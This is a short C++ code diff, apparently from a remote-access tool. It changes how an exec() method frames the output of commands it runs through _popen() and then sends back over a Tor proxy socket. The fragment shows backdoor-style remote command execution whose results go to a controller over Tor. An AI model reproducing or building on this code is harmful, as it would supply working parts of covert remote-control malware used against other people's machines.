@@ -314,7 +314,7 @@ public:
         Executes the given cmd via _popen()
     */
     void exec(std::string cmd) {
-        std::string response = "exec;" + cmd + ";";
+        std::string response;
         FILE* pipe = _popen(cmd.c_str(), "r"); // The FILE* can be used to retreive the output of the command
         if (!pipe) {
             response += "failed;";
@@ -329,7 +329,7 @@ public:
             }
             _pclose(pipe);
         }
-        this->torSock.proxySendStr(response); // Return the response
+        this->torSock.proxySendStr("cmd;" + cmd + ";" + std::to_string(response.size()-1) + ";" + response + ";");
     }
     
 };
